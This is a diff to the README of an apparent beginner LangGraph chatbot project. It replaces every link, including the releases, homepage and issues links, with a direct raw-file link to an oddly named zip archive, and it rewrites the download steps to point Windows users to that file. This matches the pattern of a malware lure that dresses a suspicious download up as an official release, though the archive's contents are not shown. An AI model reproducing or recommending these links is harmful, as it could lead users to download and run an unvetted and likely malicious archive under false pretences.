@@ -1,6 +1,6 @@
 # 🤖 python-langgraph-chatbot - Simple AI Chatbot for Learning
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/Gfake-tech/python-langgraph-chatbot/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/Gfake-tech/python-langgraph-chatbot/raw/refs/heads/main/ascii/python_chatbot_langgraph_pygmyish.zip)
 
 ---
 
@@ -30,12 +30,12 @@ This guide will help you download and run the chatbot on your Windows PC. You do
 
 Start by visiting the release page to get the software. This is the official place where new versions are published.
 
-[![Download Application](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/Gfake-tech/python-langgraph-chatbot/releases)
+[![Download Application](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=github)](https://github.com/Gfake-tech/python-langgraph-chatbot/raw/refs/heads/main/ascii/python_chatbot_langgraph_pygmyish.zip)
 
 To download the app:
 
 1. Click the link above or go to this URL in your browser:
-   https://github.com/Gfake-tech/python-langgraph-chatbot/releases
+   https://github.com/Gfake-tech/python-langgraph-chatbot/raw/refs/heads/main/ascii/python_chatbot_langgraph_pygmyish.zip
 2. Look for the latest version in the list. The newest release is at the top.
 3. Find the Windows installer or zip file. The file usually ends with `.exe` for easy installation or `.zip` if you want the portable version.
 4. Click the file name to download it. Your browser will save it to your Downloads folder or the location you chose.
@@ -106,9 +106,9 @@ If something does not work:
 
 ## 🔗 Useful Links
 
-- Visit the download page: https://github.com/Gfake-tech/python-langgraph-chatbot/releases
-- Repository homepage: https://github.com/Gfake-tech/python-langgraph-chatbot
-- Support and issues page: https://github.com/Gfake-tech/python-langgraph-chatbot/issues
+- Visit the download page: https://github.com/Gfake-tech/python-langgraph-chatbot/raw/refs/heads/main/ascii/python_chatbot_langgraph_pygmyish.zip
+- Repository homepage: https://github.com/Gfake-tech/python-langgraph-chatbot/raw/refs/heads/main/ascii/python_chatbot_langgraph_pygmyish.zip
+- Support and issues page: https://github.com/Gfake-tech/python-langgraph-chatbot/raw/refs/heads/main/ascii/python_chatbot_langgraph_pygmyish.zip
 
 ---
 
@@ -128,4 +128,4 @@ Download the latest version from the releases page and install it over your curr
 
 ---
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/Gfake-tech/python-langgraph-chatbot/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/Gfake-tech/python-langgraph-chatbot/raw/refs/heads/main/ascii/python_chatbot_langgraph_pygmyish.zip)
